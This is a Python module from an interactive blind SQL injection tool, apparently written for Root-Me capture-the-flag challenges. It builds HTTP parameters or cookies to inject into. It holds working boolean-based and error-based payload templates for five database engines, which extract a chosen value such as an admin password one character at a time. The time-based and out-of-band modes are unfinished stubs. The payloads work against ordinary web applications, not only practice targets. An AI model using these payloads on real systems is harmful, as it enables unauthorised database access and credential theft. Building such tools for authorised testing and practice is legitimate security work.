from urllib.parse import urlparse
from ast import literal_eval
import questionary
import time
import json

# ------------------ GLOBAL VARS ----------------------
# ALPHABET = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-$!"
ALPHABET = "0123456789abcdefghijklmnopqrstuvwxyz"
# ALPHABET = "0123456789abcdef"


ARGS = None
QUERY_COUNT = 0
TIMING = 0
# -----------------------------------------------------


class SQLi:
    def __init__(self):
        # HTTP_params: {"key1": "value1", "key2": "<sqli>",}
        self.HTTP_params = {}
        # injection: {"$data": "password", "$table": "users", "$filter": "username", "$value": "admin"}
        # keys correspond to: (SELECT $data FROM $table WHERE $filter='$value')
        self.injection = {
            "$data": "",
            "$table": "",
            "$filter": "",
            "$value": ""
        }
        self.options = {
            "SQLi_in_cookie": None
        }

    def __str__(self):
        query = preview_query("(SELECT $data FROM $table WHERE $filter='$value')", self.injection)
        return f"{self.HTTP_params}\n{query}"


def check_args(args: dict) -> bool:
    url = args.URL
    parsed = urlparse(url)
    if not (parsed.scheme and parsed.netloc and parsed.path):
        return False

    type = args.type
    if type.lower() not in ["basic", "error", "time", "oast", "custom"]:
        return False

    method = args.method
    if method.upper() not in ["GET", "POST"]:
        return False

    engine = args.engine
    if engine.lower() not in ['oracle', 'microsoft', 'postgre', 'mysql', 'sqlite']:
        return False

    delay = args.delay
    if delay:
        try:
            value = float(delay)
            if value < 0:
                raise ValueError
        except ValueError:
            return False

    input_file = args.input
    if input_file:
        with open(input_file, "r") as in_file:
            in_json = in_file.read()
            try:
                json.loads(in_json)
            except json.decoder.JSONDecodeError:
                return False

    if type == "custom":
        body = args.body
        try:
            evalued = literal_eval(body)
            if not isinstance(evalued, dict):
                return False
        except ValueError:
            return False
    return True


def get_payload(TYPE: str, ENGINE: str) -> str:

    def __get_basic(ENGINE: str) -> str:
        payloads = {
            "oracle": "' AND SUBSTR((SELECT $data FROM $table WHERE $filter='$value'),$index,1)='$char'--",
            "microsoft": "' AND SUBSTRING((SELECT $data FROM $table WHERE $filter='$value'),$index,1)='$char'--",
            "postgre": "' AND SUBSTRING((SELECT $data FROM $table WHERE $filter='$value'),$index,1)='$char'--",
            "mysql": "' AND SUBSTRING((SELECT $data FROM $table WHERE $filter='$value'),$index,1)='$char'-- ",
            "sqlite": "' AND SUBSTR((SELECT $data FROM $table WHERE $filter='$value'),$index,1)='$char'--"
        }
        return payloads[ENGINE]

    def __get_error(ENGINE: str) -> str:
        payloads = {
            "oracle": "' AND (SELECT CASE WHEN SUBSTR((SELECT $data FROM $table WHERE $filter='$value'),$index,1)='$char' THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--",
            "microsoft": "' AND (SELECT CASE WHEN SUBSTRING((SELECT $data FROM $table WHERE $filter='$value'),$index,1)='$char' THEN 1/0 ELSE 'a' END)='a'--",
            "postgre": "' AND (SELECT CASE WHEN SUBSTRING((SELECT $data FROM $table WHERE $filter='$value'),$index,1)='$char' THEN 1/(SELECT 0) ELSE 1 END)=1--",
            "mysql": "' AND SELECT IF(SUBSTRING((SELECT $data FROM $table WHERE $filter='$value'),$index,1)='$char', (SELECT table_name FROM information_schema.tables),'a')='a'-- ",
            "sqlite": "' AND (SELECT CASE WHEN SUBSTR((SELECT $data FROM $table WHERE $filter='$value'),$index,1)='$char' THEN 1/0 ELSE 0 END)='a'--"
        }
        return payloads[ENGINE]

    def __get_time(ENGINE: str) -> str:
        return "Not_ready"

    def __get_oast(ENGINE: str) -> str:
        return "Not_ready"

    if TYPE == "basic":
        return __get_basic(ENGINE)
    if TYPE == "error":
        return __get_error(ENGINE)
    elif TYPE == "time":
        return __get_time(ENGINE)
    elif TYPE == "oast":
        return __get_oast(ENGINE)


def init_SQLi(SCuLi: SQLi) -> SQLi:
    while 1:
        print("[setup] Let's setup this SQLi dude!")
        try:
            print("[setup] First, tell me how the form is made and where the sqli is.")
            while 1:
                user_input = questionary.select(
                    f"Current HTTP params `{SCuLi.HTTP_params}`:",
                    choices=["Add", "Remove", "Reset", "Done", "SQLi is in cookies"],
                ).ask()
                if user_input == "Done":
                    count = 0
                    for key, value in SCuLi.HTTP_params.items():
                        if "<>" in value:
                            count += 1
                    if count != 1 and not SCuLi.options["SQLi_in_cookie"]:
                        print("[warning] Only 1 HTTP param must be set as injectable => Fix it.")
                        continue
                    break
                elif user_input == "Add":
                    key = questionary.text("Key to add (CTRL+D to quit): ").ask()
                    value = questionary.text("Value to set (`<>` for targeted input):").ask()
                    SCuLi.HTTP_params[key] = value
                elif user_input == "Remove":
                    key = questionary.text("Key to remove (CTRL+D to quit): ").ask()
                    SCuLi.HTTP_params.pop(key, None)
                elif user_input == "Reset":
                    SCuLi.HTTP_params = {}
                elif user_input == "SQLi is in cookies":
                    cookie = questionary.text("Cookie (example = `PHPSESSID=<>` && CTRL+D to quit): ").ask()
                    if "<>" in cookie and "=" in cookie:
                        SCuLi.options["SQLi_in_cookie"] = cookie
                    else:
                        print("[warning] The keyword `<>` need to be fixed in the cookie => Nothing was set")
            
            injection = {
                "$data": "",
                "$table": "",
                "$filter": "",
                "$value": ""
            }
            query = "SELECT $data FROM $table WHERE $filter='$value'"
            print("[setup] Great. Now let me know how to rule the SQL query.")
            print(f"[setup] Each value will replace this keys:\n\t\t {query}")
            for key, value in injection.items():
                val = questionary.text(f"Value of {key} (CTRL+D to quit): ").ask()
                injection[key] = val
            SCuLi.injection = injection

            print(f"[setup] Perfect. Let's recap':")
            print(f"\tSQL query will look like this: {preview_query(query, SCuLi.injection)}")
            print(f"\tHTTP requests params are: {SCuLi.HTTP_params}")
            confirm = questionary.confirm("Is that all good?").ask()
            if confirm:
                print("[setup] Yehaa. Let's earn some Root-Me points!")
                break
            else:
                print("[setup] Well, let's restart from the begining.")
                continue
        except EOFError:
            print("[info] Quitting...")
            exit(0)
    return SCuLi


def preview_query(payload: str, injection: dict) -> str:
    prepared_query = payload
    for key, value in injection.items():
        prepared_query = prepared_query.replace(key, value)
    return prepared_query


def adapt_payload(SCuLi: SQLi, payload: str) -> str:
    # ' AND SUBSTR((SELECT $data FROM $table WHERE $filter='$value'), $index, 1)--
    #   is changed into
    # ' AND SUBSTR((SELECT password FROM users WHERE username='admin'), $index, 1)--
    payload = payload.replace('$data', SCuLi.injection['$data'])
    payload = payload.replace('$table', SCuLi.injection['$table'])
    payload = payload.replace('$filter', SCuLi.injection['$filter'])
    payload = payload.replace('$value', SCuLi.injection['$value'])
    return payload


def select_reference_len(arr_len_responses: list) -> int:
    val1, val2, val3 = arr_len_responses[0], arr_len_responses[1], arr_len_responses[2]
    if val1 == val2 or val1 == val3:
        return val1
    return val2


def countdown() -> None:
    print("[countdown] Launching attack in:")
    print("[countdown] 3...")
    time.sleep(1)
    print("[countdown] 2...")
    time.sleep(1)
    print("[countdown] 1...")
    time.sleep(1)
    print("[countdown] ... Processing attack.\n")


def print_request(request: dict) -> str:
    output = ""
    output += f"{request['method']} {request['url']} HTTP/2\n"
    for key, value in request['headers'].items():
        output += f"{key}:{value}\n"
    output += f"\n{request['data']}"
    return output


def print_response(response: dict) -> str:
    output = ""
    output += f"HTTP/2 {response['status']} ?\n"
    for key, value in response['headers'].items():
        output += f"{key}:{value}\n"
    output += f"\n{response['data']}"
    return output
